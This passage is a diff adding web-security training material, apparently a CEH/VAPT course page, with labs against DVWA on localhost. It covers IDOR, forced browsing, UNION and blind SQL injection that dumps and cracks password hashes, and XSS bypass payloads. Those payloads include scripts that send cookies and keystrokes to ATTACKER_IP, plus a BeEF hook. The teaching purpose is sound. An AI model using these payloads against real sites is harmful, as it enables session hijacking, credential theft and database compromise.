+      <tr><td class="tm">Referrer-Policy</td><td>Sensitive URL leakage in Referer header to third parties</td><td><code style="color:var(--cyan)">strict-origin-when-cross-origin</code></td><td class="tb">LOW — info disclosure</td></tr>
+      <tr><td class="tm">Permissions-Policy</td><td>Disables browser features (camera, mic, geolocation) not needed</td><td><code style="color:var(--cyan)">camera=(), microphone=(), geolocation=()</code></td><td class="tb">LOW — info gathering</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+03 — OWASP Top 10 Overview
+══════════════════ -->
+<div class="section" id="s3">
+  <div class="sec-head">
+    <span class="sec-num">03</span>
+    <div class="sec-meta">
+      <div class="sec-title">OWASP Top 10 — Complete Overview</div>
+      <div class="sec-sub">The ten most critical web application security risks (2021 edition)</div>
+    </div>
+    <span class="badge b-mag">OWASP</span>
+  </div>
+
+  <div class="theory">
+    <h4>The OWASP Top 10 — Why It Matters</h4>
+    <p>The <strong>OWASP Top 10</strong> (Open Web Application Security Project) is the most widely referenced web application security standard. Every VAPT engagement, every secure code review, every web application vulnerability scanner is organized around it. CEH v13 tests it extensively. Every SOC analyst working web application incidents references it.</p>
+    <p>The list is based on actual breach data, not theoretical risks. These are the vulnerabilities being exploited in production systems right now — understanding them deeply is the core of web application security.</p>
+  </div>
+
+  <div class="owasp-item">
+    <span class="oi-rank" style="color:var(--red);">A01</span>
+    <div class="oi-body">
+      <div class="oi-name">Broken Access Control</div>
+      <div class="oi-desc">Users can access resources or perform actions beyond their intended permissions. IDOR (Insecure Direct Object Reference), forced browsing to admin pages, missing authorization on API endpoints, privilege escalation. <strong>#1 category in 94% of tested applications.</strong></div>
+      <div class="oi-tags">
+        <span class="oi-tag" style="background:var(--red-dim);color:var(--red);border-color:rgba(255,82,82,0.2);">IDOR</span>
+        <span class="oi-tag" style="background:var(--red-dim);color:var(--red);border-color:rgba(255,82,82,0.2);">Forced Browsing</span>
+        <span class="oi-tag" style="background:var(--red-dim);color:var(--red);border-color:rgba(255,82,82,0.2);">Privilege Escalation</span>
+        <span class="oi-tag" style="background:var(--red-dim);color:var(--red);border-color:rgba(255,82,82,0.2);">CVSS: 9.8</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="owasp-item">
+    <span class="oi-rank" style="color:var(--amber);">A02</span>
+    <div class="oi-body">
+      <div class="oi-name">Cryptographic Failures</div>
+      <div class="oi-desc">Sensitive data exposed due to weak/absent encryption, protocol downgrade, hardcoded secrets, or transmitting data in cleartext. PII, passwords, financial data in HTTP, weak hashing (MD5, SHA-1), private keys committed to GitHub.</div>
+      <div class="oi-tags">
+        <span class="oi-tag" style="background:var(--amber-dim);color:var(--amber);border-color:rgba(255,171,64,0.2);">Cleartext Data</span>
+        <span class="oi-tag" style="background:var(--amber-dim);color:var(--amber);border-color:rgba(255,171,64,0.2);">Weak Hash</span>
+        <span class="oi-tag" style="background:var(--amber-dim);color:var(--amber);border-color:rgba(255,171,64,0.2);">Secret Exposure</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="owasp-item">
+    <span class="oi-rank" style="color:var(--red);">A03</span>
+    <div class="oi-body">
+      <div class="oi-name">Injection</div>
+      <div class="oi-desc">User-supplied data is sent to an interpreter as part of a command or query. SQL injection (most common), command injection (OS-level), LDAP injection, XPath injection. Attacker can read, modify, delete databases or execute OS commands.</div>
+      <div class="oi-tags">
+        <span class="oi-tag" style="background:var(--red-dim);color:var(--red);border-color:rgba(255,82,82,0.2);">SQLi</span>
+        <span class="oi-tag" style="background:var(--red-dim);color:var(--red);border-color:rgba(255,82,82,0.2);">Command Injection</span>
+        <span class="oi-tag" style="background:var(--red-dim);color:var(--red);border-color:rgba(255,82,82,0.2);">LDAP Injection</span>
+        <span class="oi-tag" style="background:var(--red-dim);color:var(--red);border-color:rgba(255,82,82,0.2);">CVSS: 9.8</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="owasp-item">
+    <span class="oi-rank" style="color:var(--amber);">A04</span>
+    <div class="oi-body">
+      <div class="oi-name">Insecure Design</div>
+      <div class="oi-desc">Architectural and business logic flaws — security wasn't considered during design. "Forgot password" flows that leak info, unlimited login attempts, missing rate limiting, business logic that can be exploited (apply coupon multiple times, negative cart values).</div>
+      <div class="oi-tags">
+        <span class="oi-tag" style="background:var(--amber-dim);color:var(--amber);border-color:rgba(255,171,64,0.2);">Business Logic</span>
+        <span class="oi-tag" style="background:var(--amber-dim);color:var(--amber);border-color:rgba(255,171,64,0.2);">Design Flaw</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="owasp-item">
+    <span class="oi-rank" style="color:var(--amber);">A05</span>
+    <div class="oi-body">
+      <div class="oi-name">Security Misconfiguration</div>
+      <div class="oi-desc">Default credentials, unnecessary services enabled, verbose error messages revealing stack traces, directory listing, cloud storage publicly accessible, debug endpoints left active in production.</div>
+      <div class="oi-tags">
+        <span class="oi-tag" style="background:var(--amber-dim);color:var(--amber);border-color:rgba(255,171,64,0.2);">Default Creds</span>
+        <span class="oi-tag" style="background:var(--amber-dim);color:var(--amber);border-color:rgba(255,171,64,0.2);">Info Disclosure</span>
+        <span class="oi-tag" style="background:var(--amber-dim);color:var(--amber);border-color:rgba(255,171,64,0.2);">Open Cloud</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="owasp-item">
+    <span class="oi-rank" style="color:var(--magenta);">A06</span>
+    <div class="oi-body">
+      <div class="oi-name">Vulnerable & Outdated Components</div>
+      <div class="oi-desc">Using libraries, frameworks, or other software components with known vulnerabilities. Log4Shell (CVE-2021-44228) spread through outdated Log4j. Running end-of-life software (PHP 5.x, jQuery 1.x) without patching creates exploitable CVEs.</div>
+      <div class="oi-tags">
+        <span class="oi-tag" style="background:var(--mag-glow);color:var(--magenta);border-color:var(--mag-dim);">CVEs</span>
+        <span class="oi-tag" style="background:var(--mag-glow);color:var(--magenta);border-color:var(--mag-dim);">Supply Chain</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="owasp-item">
+    <span class="oi-rank" style="color:var(--amber);">A07</span>
+    <div class="oi-body">
+      <div class="oi-name">Identification & Authentication Failures</div>
+      <div class="oi-desc">Weak authentication implementations — no MFA, weak password policies, default credentials, insecure session management, credential stuffing not prevented, sessions not invalidated on logout.</div>
+      <div class="oi-tags">
+        <span class="oi-tag" style="background:var(--amber-dim);color:var(--amber);border-color:rgba(255,171,64,0.2);">Brute Force</span>
+        <span class="oi-tag" style="background:var(--amber-dim);color:var(--amber);border-color:rgba(255,171,64,0.2);">Session Issues</span>
+        <span class="oi-tag" style="background:var(--amber-dim);color:var(--amber);border-color:rgba(255,171,64,0.2);">Weak MFA</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="owasp-item">
+    <span class="oi-rank" style="color:var(--red);">A08</span>
+    <div class="oi-body">
+      <div class="oi-name">Software & Data Integrity Failures</div>
+      <div class="oi-desc">Insecure deserialization, unsigned software updates, CI/CD pipelines without integrity checks. Attacker manipulates serialized objects to achieve RCE. SolarWinds-style supply chain attacks via compromised build pipelines.</div>
+      <div class="oi-tags">
+        <span class="oi-tag" style="background:var(--red-dim);color:var(--red);border-color:rgba(255,82,82,0.2);">Deserialization RCE</span>
+        <span class="oi-tag" style="background:var(--red-dim);color:var(--red);border-color:rgba(255,82,82,0.2);">Supply Chain</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="owasp-item">
+    <span class="oi-rank" style="color:var(--cyan);">A09</span>
+    <div class="oi-body">
+      <div class="oi-name">Security Logging & Monitoring Failures</div>
+      <div class="oi-desc">Insufficient logging, monitoring, and alerting means breaches go undetected for months. Average breach dwell time: 197 days without good monitoring. No alerts on failed logins, no log retention, no SIEM correlation.</div>
+      <div class="oi-tags">
+        <span class="oi-tag" style="background:var(--cyan-glow);color:var(--cyan);border-color:var(--cyan-dim);">No Monitoring</span>
+        <span class="oi-tag" style="background:var(--cyan-glow);color:var(--cyan);border-color:var(--cyan-dim);">Long Dwell Time</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="owasp-item">
+    <span class="oi-rank" style="color:var(--cyan);">A10</span>
+    <div class="oi-body">
+      <div class="oi-name">Server-Side Request Forgery (SSRF)</div>
+      <div class="oi-desc">App fetches a URL provided by user without validation. Attacker provides internal URLs to access metadata services (AWS IMDSv1: 169.254.169.254), internal databases, admin panels. Capital One breach: SSRF → AWS metadata → IAM credentials → S3 data exfil.</div>
+      <div class="oi-tags">
+        <span class="oi-tag" style="background:var(--cyan-glow);color:var(--cyan);border-color:var(--cyan-dim);">Cloud Metadata</span>
+        <span class="oi-tag" style="background:var(--cyan-glow);color:var(--cyan);border-color:var(--cyan-dim);">Internal Pivot</span>
+        <span class="oi-tag" style="background:var(--cyan-glow);color:var(--cyan);border-color:var(--cyan-dim);">CVSS: 9.8</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+04 — A01 Broken Access Control
+══════════════════ -->
+<div class="section" id="s4">
+  <div class="sec-head">
+    <span class="sec-num">04</span>
+    <div class="sec-meta">
+      <div class="sec-title">A01 — Broken Access Control</div>
+      <div class="sec-sub">IDOR, forced browsing, privilege escalation, and missing authorization checks</div>
+    </div>
+    <span class="badge b-red">OWASP A01</span>
+  </div>
+
+  <div class="theory red">
+    <h4>Broken Access Control — The #1 Web Vulnerability</h4>
+    <p><strong>Broken Access Control</strong> occurs when a system does not properly enforce what actions authenticated users are allowed to perform or what resources they can access. It's different from authentication (proving who you are) — it's about what you're <em>allowed to do</em> once authenticated.</p>
+    <p><strong>IDOR (Insecure Direct Object Reference)</strong> is the most common form: the application uses user-supplied input directly to access objects (database records, files) without checking if the authenticated user is authorized to access that specific object. Changing <code style="color:var(--cyan)">?user_id=1001</code> to <code style="color:var(--cyan)">?user_id=1002</code> and getting another user's data is IDOR.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🔓</span>
+      <span class="ph-t">Lab 4.1 — IDOR exploitation on DVWA and Juice Shop</span>
+      <span class="ph-tag pt-lab">Access Control Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Find IDOR in DVWA — Access another user's profile</div>
+            <div class="code" data-label="browser / burp">
+<span class="cm"># Login to DVWA as user 'admin', navigate to profile</span>
+<span class="cm"># URL typically looks like: /dvwa/vulnerabilities/idor/?user=1</span>
+
+<span class="cm"># Test IDOR: change user ID parameter</span>
+<span class="cm"># Original: /dvwa/vulnerabilities/idor/?user=1  (your profile)</span>
+<span class="cm"># Modified: /dvwa/vulnerabilities/idor/?user=2  (another user's profile)</span>
+<span class="cm"># If you see another user's data = IDOR confirmed</span>
+
+<span class="cm"># Also test: other ID formats</span>
+<span class="cm"># Integer: user=1, user=2, user=3...</span>
+<span class="cm"># UUID: change last character</span>
+<span class="cm"># Encoded: try base64 decode the parameter</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Forced Browsing — Access admin pages as a regular user</div>
+            <div class="code" data-label="bash — gobuster">
+<span class="cm"># Discover hidden directories and admin paths</span>
+<span class="cmd">gobuster dir</span> <span class="flag">-u</span> http://localhost:8080/dvwa/ \
+  <span class="flag">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  <span class="flag">-x</span> php,html,txt \
+  <span class="flag">-t</span> 50
+
+<span class="cm"># Or with ffuf</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> http://localhost:8080/dvwa/FUZZ \
+  <span class="flag">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt \
+  <span class="flag">-mc</span> 200,301,302,403
+
+<span class="cm"># If /admin/ returns 200 or 302 when logged in as regular user → access control bypass</span>
+<span class="cm"># Document: "Admin panel accessible without admin role - HTTP 200 returned"</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Horizontal vs Vertical privilege escalation</div>
+            <div class="code" data-label="concept + burp test">
+<span class="cm">Horizontal escalation: Access OTHER users' data at SAME privilege level</span>
+<span class="cm">Example: User A accesses User B's order history by changing order_id</span>
+<span class="cm">Test: /api/orders/1001 (yours) → /api/orders/1002 (someone else's)</span>
+
+<span class="cm">Vertical escalation: Access HIGHER privilege functionality</span>
+<span class="cm">Example: Regular user accesses admin-only endpoint</span>
+<span class="cm">Test: Add admin role parameter, modify JWT role claim</span>
+
+<span class="cm"># In Burp Suite: Intercept the API call</span>
+<span class="cm"># Original request:</span>
+GET /api/v1/users/1001/orders HTTP/1.1
+Authorization: Bearer [user_jwt_token]
+
+<span class="cm"># Modified request:</span>
+GET /api/v1/users/1002/orders HTTP/1.1
+Authorization: Bearer [user_jwt_token]
+<span class="cm"># → Check if 200 OK with other user's data is returned</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">4</span>
+          <div class="sc">
+            <div class="st">Document the finding for your VAPT report</div>
+            <div class="code" data-label="finding template">
+<span class="kw">Finding:</span>    Insecure Direct Object Reference (IDOR)
+<span class="kw">Severity:</span>   HIGH / CRITICAL (depends on data exposed)
+<span class="kw">CVSS 3.1:</span>   8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)
+<span class="kw">URL:</span>        http://target.com/api/users/{id}/profile
+
+<span class="kw">Proof of Concept:</span>
+  1. Login as user A (user_id=1001)
+  2. Send GET /api/users/1002/profile with user A's session token
+  3. Response: HTTP 200 with user B's full profile (name, email, phone, address)
+  
+<span class="kw">Impact:</span>
+  All user records accessible to any authenticated user.
+  Estimated 50,000 user records exposed.
+  DPDP Act compliance breach — personal data of Indian users.
+
+<span class="kw">Remediation:</span>
+  1. Implement server-side authorization checks for every object access
+  2. Verify that user's session matches the requested object owner
+  3. Use random/UUID identifiers instead of sequential integers
+  4. Never rely on client-supplied user IDs for access decisions
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+05 — A03 SQL Injection
+══════════════════ -->
+<div class="section" id="s5">
+  <div class="sec-head">
+    <span class="sec-num">05</span>
+    <div class="sec-meta">
+      <div class="sec-title">A03 — SQL Injection In Full Depth</div>
+      <div class="sec-sub">Error-based, union-based, blind (boolean & time), and second-order injection</div>
+    </div>
+    <span class="badge b-red">OWASP A03</span>
+  </div>
+
+  <div class="theory red">
+    <h4>SQL Injection — The Most Devastating Web Vulnerability</h4>
+    <p><strong>SQL Injection (SQLi)</strong> occurs when user-supplied input is concatenated directly into SQL queries without proper sanitization. The attacker injects SQL syntax that changes the query's logic. The consequences: read any data from the database, modify or delete data, bypass authentication, and in some configurations — execute OS commands on the database server.</p>
+    <p>SQLi exists because developers write code like: <code style="color:var(--cyan)">query = "SELECT * FROM users WHERE id = " + user_input</code>. When <code style="color:var(--cyan)">user_input</code> is <code style="color:var(--cyan)">1 OR 1=1</code>, the query returns all users. When it's <code style="color:var(--cyan)">1; DROP TABLE users--</code>, it can destroy the database.</p>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="ck r">Error-Based SQLi</div>
+      <div class="cv">Database error messages reveal query structure and data. Attacker extracts data through deliberately triggered errors. Easiest to exploit — errors give direct feedback. Fix: disable verbose errors in production.</div>
+    </div>
+    <div class="card">
+      <div class="ck r">UNION-Based SQLi</div>
+      <div class="cv">UNION statement appended to query to retrieve data from different tables. Must match number of columns and data types. Most common for data extraction — databases, tables, users, passwords.</div>
+    </div>
+    <div class="card">
+      <div class="ck r">Boolean Blind</div>
+      <div class="cv">No visible output. Application behaves differently for true vs false conditions. Ask yes/no questions about the data character by character. Slow but reliable when UNION-based is blocked.</div>
+    </div>
+    <div class="card">
+      <div class="ck r">Time-Based Blind</div>
+      <div class="cv">Inject SLEEP() or WAITFOR DELAY. If condition is true, response delays. No output needed — just response timing. Works when boolean blind doesn't. Very slow for large data extraction.</div>
+    </div>
+    <div class="card">
+      <div class="ck r">Second-Order</div>
+      <div class="cv">Payload stored safely, but unsafely used later. "Stored SQLi." Username stored as <code style="color:var(--cyan)">admin'--</code> then used in a password change query. Harder to find, harder to fix.</div>
+    </div>
+    <div class="card">
+      <div class="ck r">Out-of-Band</div>
+      <div class="cv">Data extracted via different channel — DNS or HTTP requests from the database server to attacker-controlled server. Useful when all other channels are blocked. Requires DB outbound internet access.</div>
+    </div>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">💉</span>
+      <span class="ph-t">Lab 5.1 — Manual SQL injection — from detection to database dump</span>
+      <span class="ph-tag pt-lab">SQLi Full Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <div class="note red"><span class="ni">⚠</span><span>Target: DVWA running locally (http://localhost:8080/dvwa/vulnerabilities/sqli/). Set security level to LOW to start. Increase to MEDIUM/HIGH after completing the low level.</span></div>
+      <ol class="steps" style="margin-top:14px;">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Test for injection vulnerability</div>
+            <div class="code" data-label="DVWA input field">
+<span class="cm"># Step 1: Test with single quote to break the query</span>
+Input: <span class="hi">'</span>
+<span class="cm"># Expected: SQL error → "You have an error in your SQL syntax..."</span>
+<span class="cm"># Error = the input reaches the SQL query unfiltered = INJECTABLE</span>
+
+<span class="cm"># If no error, try:</span>
+Input: <span class="hi">'--</span>         <span class="cm"># comment out rest of query</span>
+Input: <span class="hi">1' OR '1'='1</span>  <span class="cm"># always-true condition</span>
+Input: <span class="hi">1' OR 1=1--</span>   <span class="cm"># always-true with comment</span>
+<span class="cm"># If '1' OR '1'='1 returns ALL users = SQLi confirmed</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Determine number of columns (required for UNION)</div>
+            <div class="code" data-label="DVWA input">
+<span class="cm"># Use ORDER BY to find column count (increment until error)</span>
+Input: <span class="hi">1' ORDER BY 1--</span>   <span class="cm"># no error</span>
+Input: <span class="hi">1' ORDER BY 2--</span>   <span class="cm"># no error</span>
+Input: <span class="hi">1' ORDER BY 3--</span>   <span class="cm"># ERROR → only 2 columns!</span>
+<span class="cm"># 2 columns confirmed</span>
+
+<span class="cm"># Alternative: UNION SELECT NULL,NULL (try adding NULLs until success)</span>
+Input: <span class="hi">1' UNION SELECT NULL--</span>     <span class="cm"># error</span>
+Input: <span class="hi">1' UNION SELECT NULL,NULL--</span>  <span class="cm"># no error → 2 columns</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Extract database information via UNION SELECT</div>
+            <div class="code" data-label="DVWA input">
+<span class="cm"># Get database version, current user, and database name</span>
+Input: <span class="hi">1' UNION SELECT version(), user()--</span>
+<span class="cm"># Returns: 5.7.38-log | dvwa@localhost</span>
+
+Input: <span class="hi">1' UNION SELECT database(), NULL--</span>
+<span class="cm"># Returns: dvwa (current database name)</span>
+
+<span class="cm"># List all databases</span>
+Input: <span class="hi">1' UNION SELECT schema_name, NULL FROM information_schema.schemata--</span>
+<span class="cm"># Returns: information_schema, dvwa, mysql, performance_schema</span>
+
+<span class="cm"># List all tables in dvwa database</span>
+Input: <span class="hi">1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa'--</span>
+<span class="cm"># Returns: guestbook, users</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">4</span>
+          <div class="sc">
+            <div class="st">Dump the users table</div>
+            <div class="code" data-label="DVWA input">
+<span class="cm"># Get column names from users table</span>
+Input: <span class="hi">1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' AND table_schema='dvwa'--</span>
+<span class="cm"># Returns: user_id, first_name, last_name, user, password, avatar, last_login, failed_login</span>
+
+<span class="cm"># Dump usernames and password hashes</span>
+Input: <span class="hi">1' UNION SELECT user, password FROM users--</span>
+<span class="cm"># Returns:</span>
+<span class="out"># admin | 5f4dcc3b5aa765d61d8327deb882cf99  (MD5 of "password")</span>
+<span class="out"># gordonb | e99a18c428cb38d5f260853678922e03  (MD5 of "abc123")</span>
+
+<span class="cm"># Now crack these MD5 hashes with hashcat:</span>
+<span class="cmd">echo</span> <span class="val">"5f4dcc3b5aa765d61d8327deb882cf99"</span> > hashes.txt
+<span class="cmd">hashcat</span> <span class="flag">-m 0</span> hashes.txt /usr/share/wordlists/rockyou.txt
+<span class="cm"># 5f4dcc3b... → password (cracked in seconds)</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">5</span>
+          <div class="sc">
+            <div class="st">Time-based blind SQLi (when no output is shown)</div>
+            <div class="code" data-label="bash — blind SQLi">
+<span class="cm"># If application shows nothing but query runs, use time delays</span>
+<span class="cm"># True condition: response takes 5+ seconds</span>
+Input: <span class="hi">1' AND SLEEP(5)--</span>
+<span class="cm"># Time the response: 5s delay = SQLi confirmed (application is MySQL)</span>
+
+<span class="cm"># Extract data bit by bit using conditionals</span>
+<span class="cm"># Is first char of db name 'd'?</span>
+Input: <span class="hi">1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0)--</span>
+<span class="cm"># 5s delay → yes, first char is 'd'</span>
+
+Input: <span class="hi">1' AND IF(SUBSTRING(database(),2,1)='v', SLEEP(5), 0)--</span>
+<span class="cm"># 5s delay → second char is 'v'</span>
+<span class="cm"># Tedious manually — use sqlmap for blind extraction (Lab 12)</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+06 — A07 XSS
+══════════════════ -->
+<div class="section" id="s6">
+  <div class="sec-head">
+    <span class="sec-num">06</span>
+    <div class="sec-meta">
+      <div class="sec-title">A07 — Cross-Site Scripting (XSS)</div>
+      <div class="sec-sub">Reflected, Stored, DOM-based XSS — cookie theft, session hijacking, and keyloggers</div>
+    </div>
+    <span class="badge b-red">OWASP A07</span>
+  </div>
+
+  <div class="theory red">
+    <h4>XSS — Injecting Malicious Scripts into Trusted Web Pages</h4>
+    <p><strong>Cross-Site Scripting (XSS)</strong> allows attackers to inject malicious scripts into web pages viewed by other users. The browser trusts content from the website — so injected JavaScript runs with full page privileges: read cookies, access localStorage, make HTTP requests, capture keystrokes, redirect users, modify page content.</p>
+    <p><strong>Why it matters:</strong> A stored XSS on a banking application's message center means every customer who views that message gets their session cookie stolen. With their cookie, the attacker logs into their account — no password needed. Or the injected script silently modifies fund transfer amounts before submission.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">📜</span>
+      <span class="ph-t">Lab 6.1 — Reflected, Stored, and DOM XSS with cookie theft payload</span>
+      <span class="ph-tag pt-lab">XSS Full Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Basic XSS detection — does input get reflected?</div>
+            <div class="code" data-label="DVWA — XSS Reflected">
+<span class="cm"># Test if input is reflected without sanitization</span>
+Input: <span class="hi">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span>
+<span class="cm"># Pop-up showing domain = Reflected XSS confirmed</span>
+
+<span class="cm"># If script tags are filtered, try event handlers:</span>
+Input: <span class="hi">&lt;img src=x onerror=alert(1)&gt;</span>
+Input: <span class="hi">&lt;svg onload=alert(1)&gt;</span>
+Input: <span class="hi">&lt;body onpageshow=alert(1)&gt;</span>
+Input: <span class="hi">&lt;details open ontoggle=alert(1)&gt;</span>
+
+<span class="cm"># Case variation bypass (case-insensitive filter):</span>
+Input: <span class="hi">&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</span>
+
+<span class="cm"># HTML entity bypass:</span>
+Input: <span class="hi">&lt;img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)&gt;</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Cookie theft payload — steal session cookie</div>
+            <div class="code" data-label="payload + listener">
+<span class="cm"># Attacker sets up a listener to receive stolen cookies</span>
+<span class="cmd">python3 -m http.server</span> 4444  <span class="cm"># simple HTTP listener</span>
+
+<span class="cm"># XSS payload that exfiltrates the cookie:</span>
+Input: <span class="hi">&lt;script&gt;
+  new Image().src = 'http://ATTACKER_IP:4444/steal?c=' + document.cookie;
+&lt;/script&gt;</span>
+
+<span class="cm"># When victim's browser executes this:</span>
+<span class="cm"># → Their browser makes GET request to attacker's server</span>
+<span class="cm"># → URL contains: /steal?c=PHPSESSID=abc123xyz</span>
+<span class="cm"># Attacker copies that cookie into their browser → logged in as victim</span>
+
+<span class="cm"># Real cookie theft using fetch() (more reliable):</span>
+Input: <span class="hi">&lt;script&gt;
+fetch('http://ATTACKER_IP:4444/steal?c=' + btoa(document.cookie));
+&lt;/script&gt;</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Stored XSS — persists for every visitor</div>
+            <div class="code" data-label="DVWA — XSS Stored">
+<span class="cm"># DVWA → XSS (Stored) → Guestbook</span>
+<span class="cm"># This input is saved to the database and shown to ALL visitors</span>
+
+Name: <span class="val">Hacker</span>
+Message: <span class="hi">&lt;script&gt;
+  document.location='http://ATTACKER_IP:4444/steal?c='+document.cookie;
+&lt;/script&gt;</span>
+
+<span class="cm"># Now EVERY user who visits the guestbook page is redirected</span>
+<span class="cm"># and their session cookie is stolen</span>
+
+<span class="cm"># More subtle: silent theft without redirect</span>
+Message: <span class="hi">&lt;script&gt;
+  var img=new Image();
+  img.src='http://ATTACKER_IP:4444/?c='+document.cookie;
+&lt;/script&gt;</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">4</span>
+          <div class="sc">
+            <div class="st">DOM-based XSS — client-side script is the vulnerability</div>
+            <div class="code" data-label="DVWA — XSS DOM">
+<span class="cm"># URL: http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=English</span>
+<span class="cm"># JavaScript reads "default" parameter and writes it to the page unsafely</span>
+<span class="cm"># Example vulnerable JS: document.write(location.search)</span>
+
+<span class="cm"># Exploit via URL parameter:</span>
+URL: http://localhost:8080/dvwa/vulnerabilities/xss_d/<span class="hi">?default=&lt;script&gt;alert(1)&lt;/script&gt;</span>
+
+<span class="cm"># Note: DOM XSS is often NOT sent to the server</span>
+<span class="cm"># The server log shows nothing — only the browser executes it</span>
+<span class="cm"># This is why WAFs miss many DOM XSS vulnerabilities</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">5</span>
+          <div class="sc">
+            <div class="st">Advanced XSS — JavaScript keylogger injection</div>
+            <div class="code" data-label="advanced payload">
+<span class="cm"># Full keylogger that captures everything typed on the page</span>
+Input: <span class="hi">&lt;script&gt;
+document.onkeypress = function(e) {
+  fetch('http://ATTACKER_IP:4444/key?k=' + 
+    btoa(String.fromCharCode(e.charCode)));
+};
+&lt;/script&gt;</span>
+
+<span class="cm"># Every keystroke → base64 encoded → sent to attacker server</span>
+<span class="cm"># Captures passwords typed on the page, credit card numbers, messages</span>
+
+<span class="cm"># BeEF (Browser Exploitation Framework) automates all of the above:</span>
+<span class="cm"># Single hook.js payload gives attacker a dashboard to control browser</span>
+<span class="cmd">sudo beef-xss</span>  <span class="cm"># start BeEF on Kali</span>
+<span class="cm"># Inject: &lt;script src="http://ATTACKER_IP:3000/hook.js"&gt;&lt;/script&gt;</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+07 — A02 Cryptographic Failures
+══════════════════ -->
+<div class="section" id="s7">
+  <div class="sec-head">
+    <span class="sec-num">07</span>
+    <div class="sec-meta">
+      <div class="sec-title">A02 — Cryptographic Failures</div>
+      <div class="sec-sub">Secrets in Git, cleartext transmission, weak hashing, JWT attacks</div>
+    </div>
+    <span class="badge b-amber">OWASP A02</span>
+  </div>
+
+  <div class="theory amber">
+    <h4>Finding Cryptographic Failures in Web Applications</h4>
+    <p>Cryptographic failures in web apps manifest as: sensitive data transmitted over HTTP instead of HTTPS, passwords stored as MD5/SHA-1 without salting, API keys and database credentials committed to public GitHub repositories, JWT tokens with weak secrets or using <code style="color:var(--cyan)">alg:none</code>, session tokens that are predictable, and sensitive data stored in cleartext in cookies or localStorage.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🔑</span>
+      <span class="ph-t">Lab 7.1 — Find exposed secrets in source code and test JWT vulnerabilities</span>
+      <span class="ph-tag pt-lab">Crypto Failures Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Find secrets in JavaScript source files</div>
+            <div class="code" data-label="bash — recon">
+<span class="cm"># Download and search JavaScript files for secrets</span>
+<span class="cmd">wget</span> http://target.com/app.js <span class="flag">-O</span> app.js
+
+<span class="cm"># Search for common secret patterns</span>
+<span class="cmd">grep</span> <span class="flag">-iE</span> <span class="val">"(api_key|apikey|secret|password|token|private_key|access_key)\s*[=:]\s*['\"][^'\"]{8,}"</span> app.js
+
+<span class="cm"># Use trufflehog to scan for secrets in git history</span>
+<span class="cmd">pip3 install</span> trufflehog <span class="flag">--break-system-packages</span>
+<span class="cmd">trufflehog</span> git https://github.com/target/repo --only-verified
+
+<span class="cm"># Or gitleaks for local repositories</span>
